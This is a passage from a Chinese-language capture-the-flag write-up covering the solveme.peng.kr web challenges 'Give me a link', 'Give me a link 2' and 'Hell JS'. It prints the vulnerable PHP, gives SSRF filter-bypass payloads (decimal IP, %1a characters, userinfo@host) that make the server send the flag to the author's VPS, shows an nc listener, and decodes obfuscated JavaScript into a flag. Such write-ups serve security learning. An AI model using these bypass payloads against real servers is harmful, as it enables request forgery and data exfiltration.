class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?$/i'</span>, $parse[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed scheme'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i'</span>, $parse[<span class="string">'host'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed host'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/\/plz_give_me$/'</span>, $parse[<span class="string">'path'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">        <span class="keyword">if</span>($socket === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to create socket'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $host = gethostbyname($parse[<span class="string">'host'</span>]);</span><br><span class="line">        $port = is_null($parse[<span class="string">'port'</span>]) ? <span class="number">80</span> : $parse[<span class="string">'port'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(socket_connect($socket, $host, $port) === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to connect'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $send = <span class="string">"HEAD /"</span>.$flag.<span class="string">" HTTP/1.1\r\n"</span>.</span><br><span class="line">            <span class="string">"Host: "</span>.$host.<span class="string">":"</span>.$port.<span class="string">"\r\n"</span>.</span><br><span class="line">            <span class="string">"Connection: Close\r\n"</span>.</span><br><span class="line">            <span class="string">"\r\n\r\n"</span>;</span><br><span class="line">        socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">        $recv = socket_read($socket, <span class="number">1024</span>);var_dump($recv);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^HTTP\/1.1 200 OK\r\n/'</span>, $recv))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed response'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket_close($socket);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>跟上面一题类似，只是对于host有了过滤，这里我们用 <code>ip2long()</code> 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ip2long(<span class="string">"120.78.164.84"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>Payload ：<br><code>givemealink2.solveme.peng.kr?url=http://2018419796:8080/plz%1agive%1ame</code><br>然后在服务器上面开监听</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><p>就可以接收到返回的flag</p><h3 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?\:\/\/'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/i'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed URL'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>($parse[<span class="string">'path'</span>] !== <span class="string">'/plz_give_me'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这里发现这段代码的逻辑是用get方法接受一个参数url，而这个参数要经过三次的检测，第一次会把含有下划线，空白字符过滤掉，第二次过滤检验的是是否满足url的格式，而且必须含有<code>$_SERVER[&#39;HTTP_HOST&#39;]</code>里面的内容也就是<code>http://givemealink.solveme.peng.kr/</code>，而第三次则判断路径下是否含有<code>plz_give_me</code>这个字段，突然发现这个东西跟第一个过滤下划线的自相矛盾，查一下PHP文档，问题出现在parse_url这个函数里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line"></span><br><span class="line">    The URL to parse. Invalid characters are replaced by _.</span><br></pre></td></tr></table></figure><p>非法字符在这个函数下会自动替换成下划线，测试一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $url = urldecode(<span class="string">"http://0verwatch.top/%1atest%1a.php"</span>);</span><br><span class="line">   var_dump(parse_url($url));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"0verwatch.top"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"/_test_.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现这时候就可以利用这一点成功绕过第一个过滤，以及满足第三个过滤<br>这时候考虑第二个过滤，继续查看parse_url这个函数文档你会发现他有这样一个例子，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://username:password@hostname:9090/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url($url));</span><br></pre></td></tr></table></figure></p><p>这也是url的一种写法，现在感觉很少用在http服务上感觉在ssh连接自己的服务器上面用的多，因为一般的url都是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure></p><p>但是平常我们连接自己服务器的时候可以这样<code>ssh root@vps_ip</code> 然后输入密码，这应该也是这种类型的<br><a href="https://imgchr.com/i/P28fJO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28fJO.md.png" alt="P28fJO.md.png"></a></p><p>然后这里的话相当于username还有password没有任何实际作用，纯粹就是用来写那个$_SERVER[‘HTTP_HOST’]来进行绕过的<br>payload：<code>http://givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr@vps_ip/plz%1agive%1ame</code><br>我们再测试一下，结果完全符合我们绕过的要求<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"120.78.164.84"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">59</span>) <span class="string">"givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">12</span>) <span class="string">"/plz_give_me"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后就利用那一个<code>curl_setopt</code>函数往我们这边服务器发送flag了，vps这边监听80端口,出现flag</p><h3 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h3><p>点开发现存在一大堆Js混淆代码，解码一看发现有一堆数字很可疑<br><a href="https://imgchr.com/i/P28IQH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28IQH.md.png" alt="P28IQH.md.png"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;4&quot;+&quot;7&quot;,&quot;4&quot;+&quot;7&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;111&quot;,&quot;100&quot;,&quot;3&quot;+&quot;2&quot;,&quot;106&quot;,&quot;111&quot;,&quot;98&quot;,&quot;3&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;108&quot;,&quot;101&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;0&quot;+&quot;9&quot;,&quot;112&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;97&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;3&quot;+&quot;2&quot;,&quot;116&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;6&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;112&quot;,&quot;108&quot;,&quot;110&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;7&quot;,&quot;116&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;5&quot;+&quot;0&quot;,&quot;4&quot;+&quot;9&quot;,&quot;100&quot;,&quot;102&quot;,&quot;5&quot;+&quot;2&quot;,&quot;97&quot;,&quot;100&quot;,&quot;5&quot;+&quot;1&quot;,&quot;99&quot;,&quot;101&quot;,&quot;5&quot;+&quot;1&quot;,&quot;4&quot;+&quot;9&quot;,&quot;97&quot;,&quot;102&quot;,&quot;5&quot;+&quot;6&quot;,&quot;5&quot;+&quot;2&quot;,&quot;5&quot;+&quot;3&quot;,&quot;99&quot;,&quot;102&quot;,&quot;57&quot;,&quot;99&quot;,&quot;100&quot;,&quot;5&quot;+&quot;4&quot;,&quot;97&quot;,&quot;5&quot;+&quot;3&quot;,&quot;101&quot;,&quot;100&quot;,&quot;100&quot;,&quot;98&quot;,&quot;98&quot;,&quot;57&quot;,&quot;4&quot;+&quot;9&quot;,&quot;125&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;98&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;</span><br></pre></td></tr></table></figure></p><p>写个小脚本解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dit = [<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"111"</span>,<span class="string">"100"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"106"</span>,<span class="string">"111"</span>,<span class="string">"98"</span>,<span class="string">"3"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"9"</span>,<span class="string">"112"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"116"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"6"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"112"</span>,<span class="string">"108"</span>,<span class="string">"110"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"7"</span>,<span class="string">"116"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"5"</span>+<span class="string">"0"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"100"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"97"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"99"</span>,<span class="string">"101"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"6"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"99"</span>,<span class="string">"102"</span>,<span class="string">"57"</span>,<span class="string">"99"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"101"</span>,<span class="string">"100"</span>,<span class="string">"100"</span>,<span class="string">"98"</span>,<span class="string">"98"</span>,<span class="string">"57"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"125"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"98"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span></span><br><span class="line">]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dit:</span><br><span class="line">s = s + chr(int(i))</span><br></pre></td></tr></table></figure><p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// good job!</span><br><span class="line"></span><br><span class="line">let flag = prompt(&quot;what is the flag?&quot;);</span><br><span class="line"></span><br><span class="line">if (flag === &quot;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;plnput&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else if (flag === &quot;flag&#123;21df4ad3ce31af845cf9cd6a5eddbb91&#125;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;bingo&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;wrong&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="AntiSQL"><a href="#AntiSQL" class="headerlink" title="AntiSQL"></a>AntiSQL</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 